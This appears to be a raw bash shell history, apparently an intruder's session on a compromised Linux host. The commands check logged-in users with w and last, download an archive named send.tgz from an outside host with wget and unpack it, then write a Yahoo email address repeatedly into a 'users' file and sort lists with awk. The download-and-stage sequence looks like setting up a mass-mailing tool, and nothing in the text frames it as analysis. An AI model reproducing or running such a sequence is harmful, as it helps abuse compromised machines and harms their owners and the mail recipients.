w
last
wget www.sedan.as.ro/send.tgz
tar xzvf send.tgz
ls
cat users 
echo vreau_pufuleti@yahoo.com >users 
echo vreau_pufuleti@yahoo.com >>users 
echo vreau_pufuleti@yahoo.com >>users 
echo vreau_pufuleti@yahoo.com >>users 
echo vreau_pufuleti@yahoo.com >>users 
...
cat >bla
ls
cat bla | awk '{print $1" "$2" "$3" "$4 }' | sort | uniq > asd
head asd
cat bla | awk '{print $1" "$2" }' | sort | uniq > asd
cat bla | awk '{print $1" "$2" }' | sort | uniq > asd
cat bla | awk '{print $1" "$2" "$3" "$4 }' | sort | uniq > asd
head asd
ls
